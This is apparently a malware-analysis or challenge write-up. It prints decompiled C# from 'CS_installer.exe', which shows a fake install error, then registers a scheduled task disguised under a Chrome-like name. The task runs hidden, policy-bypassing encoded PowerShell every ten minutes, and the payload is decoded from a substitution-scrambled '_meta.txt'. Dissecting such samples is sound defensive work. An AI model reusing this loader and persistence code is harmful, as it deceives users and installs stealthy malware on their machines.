### Investigating and dissecting some of the source code from CS_installer.exe. It will be available to you if you need it.

### Function Main
```cs
private static void Main(string[] args)
{
	if (Program.MessageBox((IntPtr)0, "Install Error, incompatible system", "Error", 5) == 99)
	{
		Environment.Exit(0);
	}
	using (TaskService ts = new TaskService())
	{
		using (IEnumerator<Task> enumerator = ts.AllTasks.GetEnumerator())
		{
			while (enumerator.MoveNext())
			{
				if (enumerator.Current.Definition.Actions[0].ToString().Contains("powershell -ExecutionPolicy Bypass -WindowStyle Hidden -E"))
				{
					Environment.Exit(0);
				}
			}
		}
		TaskDefinition td = ts.NewTask();
		td.RegistrationInfo.Description = "Example task";
		td.Triggers.Add<TimeTrigger>(new TimeTrigger(DateTime.Now.AddMinutes(1.0))
		{
			Repetition = new RepetitionPattern(TimeSpan.FromMinutes(10.0), TimeSpan.Zero, false)
		});
		string script = Program.deScramble();
		td.Actions.Add<ExecAction>(new ExecAction("cmd", "/c start /min \"\" powershell -ExecutionPolicy Bypass -WindowStyle Hidden -E " + script, null));
		string[] namesDict = new string[]
		{
			"Loader",
			"Monitor",
			"Checker",
			"Conf",
			"Task",
			"Updater"
		};
		int nameIndex = new Random().Next(namesDict.Length);
		string taskName = "Chrome" + namesDict[nameIndex];
		ts.RootFolder.RegisterTaskDefinition(taskName, td);
	}
}
```

### Function DeScramble

```cs
public static string deScramble()
{
	string res = "";
	Dictionary<char, char> replaceDict = new Dictionary<char, char>
	{
		{
			'G',
			'0'
		},
		{
			'V',
			'1'
		},
		{
			'U',
			'2'
		},
		{
			'z',
			'3'
		},
		{
			'x',
			'4'
		},
		{
			'i',
			'5'
		},
		{
			'9',
			'6'
		},
		{
			'R',
			'7'
		},
		{
			'b',
			'8'
		},
		{
			'W',
			'9'
		},
		{
			'n',
			'a'
		},
		{
			'T',
			'b'
		},
		{
			'S',
			'c'
		},
		{
			'E',
			'd'
		},
		{
			'Y',
			'e'
		},
		{
			'c',
			'f'
		},
		{
			'd',
			'g'
		},
		{
			'g',
			'h'
		},
		{
			'X',
			'i'
		},
		{
			'j',
			'j'
		},
		{
			'B',
			'k'
		},
		{
			'q',
			'l'
		},
		{
			'3',
			'm'
		},
		{
			'o',
			'n'
		},
		{
			'P',
			'o'
		},
		{
			'm',
			'p'
		},
		{
			'l',
			'q'
		},
		{
			'1',
			'r'
		},
		{
			'F',
			's'
		},
		{
			'0',
			't'
		},
		{
			'e',
			'u'
		},
		{
			'w',
			'v'
		},
		{
			'a',
			'w'
		},
		{
			'u',
			'x'
		},
		{
			'J',
			'y'
		},
		{
			't',
			'z'
		},
		{
			'r',
			'A'
		},
		{
			'C',
			'B'
		},
		{
			'Z',
			'C'
		},
		{
			'Q',
			'D'
		},
		{
			'I',
			'E'
		},
		{
			's',
			'F'
		},
		{
			'=',
			'G'
		},
		{
			'D',
			'H'
		},
		{
			'O',
			'I'
		},
		{
			'7',
			'J'
		},
		{
			'y',
			'K'
		},
		{
			'H',
			'L'
		},
		{
			'v',
			'M'
		},
		{
			'M',
			'N'
		},
		{
			'L',
			'O'
		},
		{
			'N',
			'P'
		},
		{
			'2',
			'Q'
		},
		{
			'6',
			'R'
		},
		{
			'p',
			'S'
		},
		{
			'f',
			'T'
		},
		{
			'A',
			'U'
		},
		{
			'5',
			'V'
		},
		{
			'K',
			'W'
		},
		{
			'h',
			'X'
		},
		{
			'8',
			'Y'
		},
		{
			'k',
			'Z'
		},
		{
			'4',
			'='
		}
	};
	foreach (char c in File.ReadAllText("_meta.txt"))
	{
		if (replaceDict.ContainsKey(c))
		{
			res += replaceDict[c].ToString();
		}
		else
		{
			res += c.ToString();
		}
	}
	return res;
}
```
